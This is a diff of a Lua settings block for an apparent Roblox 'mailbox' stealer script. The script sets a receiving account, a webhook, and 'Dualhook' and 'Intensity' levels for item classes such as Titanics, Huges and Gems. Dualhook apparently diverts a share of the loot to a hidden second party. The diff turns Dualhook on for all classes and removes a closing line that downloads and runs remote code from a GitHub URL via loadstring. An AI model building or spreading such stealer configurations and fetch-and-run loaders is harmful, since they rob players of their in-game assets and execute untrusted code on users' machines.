@@ -1,44 +1,41 @@
 getgenv().Settings = {
     User = "TehPucuk_55",
-    Webhook = true, -- By Making This True The Users Of Your Script Will Be Able
-    -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "Monzz Better",
-  Titanics = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-  Banana = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-  Huges = {
-       Dualhook = true,
-       Intensity = 100--%
-  },
-  Pogs = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-   Exclusives = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-   Events = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-   Secrets = {
-       Dualhook = false,
-       Intensity = 100--%
-   },
-   HC_DM_Mythics = {
-       Dualhook = false,
-       Intensity = 100--%
-   },
-   Gems = {
-       Dualhook = false,
-       Intensity = 100--%
-  }
+    Titanics = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Banana = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Huges = {
+        Dualhook = true,
+        Intensity = 50 --%
+    },
+    Pogs = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Exclusives = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Events = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Secrets = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    HC_DM_Mythics = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Gems = {
+        Dualhook = true,
+        Intensity = 0 --%
+    }
 }
-    
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/Mailbox.V2/main/Test2", true))()
